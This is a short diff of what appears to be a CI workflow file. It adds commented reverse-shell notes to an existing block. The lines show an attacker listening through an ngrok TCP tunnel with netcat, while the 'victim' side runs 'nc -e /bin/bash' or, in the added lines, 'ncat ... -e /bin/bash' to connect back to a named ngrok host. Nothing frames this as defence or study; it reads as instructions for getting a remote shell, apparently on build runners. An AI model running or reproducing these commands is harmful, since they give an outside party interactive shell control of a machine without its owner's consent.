@@ -27,6 +27,9 @@ jobs:
 #--------------------------------reverce shell 44444
 #attacker=>ngrok tcp 1212 + nc -l -p 1212
 #victim =>nc -e /bin/bash  5.tcp.eu.ngrok.io 19700 
+                #or
+#sudo apt install ncat
+#ncat 5.tcp.eu.ngrok.io 19700 -e /bin/bash
 #--------------------------------
        
 #npm install -g localtunnel
